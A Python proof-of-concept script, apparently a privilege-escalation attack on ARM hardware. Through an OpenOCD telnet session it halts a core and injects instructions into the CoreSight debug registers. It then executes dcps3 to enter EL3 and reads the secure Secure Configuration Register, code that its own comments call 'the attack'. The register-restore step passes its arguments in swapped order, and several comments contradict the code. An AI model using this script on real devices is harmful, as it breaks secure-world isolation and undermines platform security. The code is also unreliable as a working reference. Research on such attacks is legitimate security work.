import pwn, time,re

# 0x80010000 is the base address of the debug registers on Core 0 to be accessed through mem_ap
DEBUG_REGISTER_ADDR = 0x80010000


# 0x80018000 is the base address of the cross trigger interface registers on Core 0 to be accessed through mem_ap
CTI_REGISTER_ADDR = 0x80018000

# Offsets of debug registers
DBGDTRRX_OFFSET = 0x80
EDITR_OFFSET = 0x84
EDSCR_OFFSET = 0x88
DBGDTRTX_OFFSET = 0x8C
EDRCR_OFFSET = 0x90
OSLAR_OFFSET = 0x300
EDLAR_OFFSET = 0xFB0
DBGAUTHSTATUS_OFFSET = 0xFB8

# Offsets of cross trigger registers
CTICONTROL_OFFSET = 0x0
CTIINTACK_OFFSET = 0x10
CTIAPPPULSE_OFFSET = 0x1C
CTIOUTEN0_OFFSET = 0xA0
CTIOUTEN1_OFFSET = 0xA4
CTITRIGOUTSTATUS_OFFSET = 0x134
CTIGATE_OFFSET = 0x140


def change_target(target,p):
    command= "targets " +str(target)
    p.sendline(command.encode('ascii'))
    p.recvuntil(b'\r>')

def read32(address,p):
    command= "mdw "+hex(address)
    p.sendline(command.encode('ascii'))
    result=p.recvuntil(b'\r>')
    result_str = result.decode('utf-8')
    pattern = r': ([0-9a-fA-F]+) '
    match = re.search(pattern, result_str)
    value=match.group(1)
    value="0x"+value
    ret=int(value,16)
    return ret

def write32(address,value,p):
    command=f"mww {hex(address)} " + "{" + hex(value)+"}"
    p.sendline(command.encode('ascii'))
    p.recvuntil(b'\r>')

def halt(cpu_num,p):
    change_target(cpu_num+1,p)
    command='halt'
    p.sendline(command.encode('ascii'))
    result=p.recvuntil(b'\r>')
    change_target(0,p)

def resume(cpu_num,p):
    change_target(cpu_num+1,p)
    command='resume'
    p.sendline(command.encode('ascii'))
    result=p.recvuntil(b'\r>')
    change_target(0,p)

def execute_ins_via_itr(ins,p):
    #CLEAR PREVIOUS ERROR
    
    #write32(CSE,DEBUG_REGISTER_ADDR+EDRCR_OFFSET,p)

    #time.sleep(0.2)
    write32(DEBUG_REGISTER_ADDR+EDITR_OFFSET,ins,p)

    time.sleep(0.2)
def save_register(ins,p):
    execute_ins_via_itr(ins,p)
    execute_ins_via_itr(0x0e15ee00,p)
    return read32(DEBUG_REGISTER_ADDR+DBGDTRTX_OFFSET,p)

def restore_register(ins,value,p):
    write32(DEBUG_REGISTER_ADDR+DBGDTRRX_OFFSET,value,p)
    execute_ins_via_itr(0x0e15ee10,p)
    execute_ins_via_itr(ins,p)

def read_scr(p):
    #set cpu0 as target
    #halt cpu1 
    halt(0,p)

    #set as target mem_ap to interact with debug registers
    change_target(0,p)

    #read the value of the register where SCR will be stored in order
    #to show that the value was not here from previous execution of the attack
    #old_dbgdtrtx=read32(DEBUG_REGISTER_ADDR+DBGDTRTX_OFFSET,p)
    #print("old_dbgdtrtx is " + hex(old_dbgdtrtx))


    #save the context 
    execute_ins_via_itr(0x0e15ee00,p)
    r0_old=read32(DEBUG_REGISTER_ADDR+DBGDTRTX_OFFSET,p)
    print("ro is " + hex(r0_old))
    dlr_old=save_register(0x0f35ee74,p)
    print("dlr is " + hex(dlr_old))

    #switch to EL3 to access secure resource
    # 0xf78f8003 <=> dcps3
    execute_ins_via_itr(0x8003f78f,p) 
    
    #read the SCR
    
    #0xee110f11 <=> mrc p15, 0, R0, c1, c1, 0
    execute_ins_via_itr(0x0f11ee11,p)

    # 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(0x0e15ee00,p)

    scr = read32(DEBUG_REGISTER_ADDR+DBGDTRTX_OFFSET,p)

    #restore the cotexttareg
    restore_register(0x0f35ee64,dlr_old,p)
    write32(r0_old, DEBUG_REGISTER_ADDR + DBGDTRRX_OFFSET,p)
    execute_ins_via_itr(0x0e15ee10,p)
    
    #resume cpu_0
    resume(0,p)


    print(f"All done, the value of SRC is {hex(scr)}")


    
telnet_process = pwn.process(['telnet', 'localhost', '4444'])
telnet_process.recvuntil(b'\r>')
read_scr(telnet_process)